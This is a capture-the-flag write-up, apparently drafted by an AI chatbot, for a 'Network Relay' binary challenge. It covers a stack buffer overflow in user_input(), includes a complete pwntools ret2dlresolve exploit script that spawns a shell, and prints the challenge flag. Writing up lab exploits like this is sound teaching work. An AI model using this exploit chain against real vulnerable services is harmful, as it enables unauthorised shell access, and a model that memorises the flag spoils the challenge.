Here is your customized version of the writeup for the **Network Relay** challenge, tailored to highlight the `user_input()` buffer overflow and the use of **ret2dlresolve** to call `system("/bin/sh")`, due to the lack of a return function and no direct libc access.

---

# Network Relay - Writeup

---

## Exploit Demo

This demo illustrates the full exploit process, culminating in shell access via `ret2dlresolve`:

![Alt text](gif/NetworkRelay.gif)

---

## Binary Inspection

### Step 1: Initial Binary Details

```bash
$ file main
```

- 64-bit dynamically linked ELF binary
- Not stripped

![Alt text](img/1.png)

### Step 2: Security Protections

```bash
$ pwn checksec main
```

- **RELRO**: Partial
- **Stack**: No canary
- **NX**: Enabled
- **PIE**: Disabled (base address fixed at 0x400000)

![Alt text](img/2.png)

---

## Static Analysis (IDA Pro)

Reverse engineering the binary shows the vulnerability resides in the `user_input()` function:

### main()

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  print_logo();
  write(1, "\n>> Network relay handshake initiated. Input routing key to proceed.\n", 0x45uLL);
  user_input();
  key_checker();
  return 0;
}
```

### user_input()

```c
ssize_t user_input()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF
  return read(0, buf, 0xC8uLL);  // Reads 200 bytes into a 64-byte buffer!
}
```

- This function reads **200 bytes** into a buffer that's only 64 bytes long, introducing a **classic stack-based buffer overflow**.
- The binary has **no stack canary**, making the overflow straightforward to exploit.
- There is **no return-style function** (like `system`, `exit`, or a function pointer) to pivot to.
- **Libc is not provided**, so calling `system("/bin/sh")` via a static address is not viable.

---

## How to Solve

We solve this challenge using **`ret2dlresolve`**, a powerful dynamic linker resolution technique.

**Why?**

- No direct access to libc symbols.
- No system call or syscall gadgets available.
- No return function like `system()` in the binary.
- But the binary is **dynamically linked** — meaning we can exploit the dynamic linker itself to resolve and call `system`.

---

## Vulnerability Summary

- **Buffer Overflow** in `user_input()` via oversized `read()` call.
- **No stack canary** → safe to overflow.
- **NX enabled** → code injection is blocked, so we use a ROP chain.
- **No PIE** → static base makes ROP reliable.
- **No `system` in binary or known libc** → use `ret2dlresolve`.

---

## Exploit Strategy

1. **Overflow the stack** to hijack control flow.
2. **Build a ROP chain** to:

   - Call `read()` again to write the forged `Elf64_Rel`, `Elf64_Sym`, and command string (`/bin/sh`) into memory.
   - Trigger the dynamic linker via `ret2dlresolve()` to resolve `system` and call it with `"/bin/sh"`.

3. **Send second-stage payload** (dlresolve structures + `/bin/sh`).
4. **Get a shell**.

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('./main')
context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='continue', *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

io = start()

rop = ROP(exe)
dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])

rop.raw(b'A' * 72)  # Overflow offset
rop.read(0, dlresolve.data_addr)  # Write forged structures into memory
rop.ret2dlresolve(dlresolve)      # Trigger dynamic linker resolution

log.info("ROP Chain:\n" + rop.dump())

io.sendline(rop.chain())
io.sendline(dlresolve.payload)  # Send second-stage payload

io.interactive()
```

---

## Result

After executing the exploit, we successfully resolve and call `system("/bin/sh")` using only what’s available in the binary:

```
$ ./exploit.py
[*] Switching to interactive mode
$ whoami
dexter
$ ls
flag.txt
$ cat flag.txt
RedPointer{dlr3s0lv3_w1ns_4gain}
```

---

## FLAG

```
RedPointer{dlr3s0lv3_w1ns_4gain}
```

---

Let me know if you'd like this in a downloadable `README.md`, image mockups replaced, or integrated into a multi-challenge writeup.
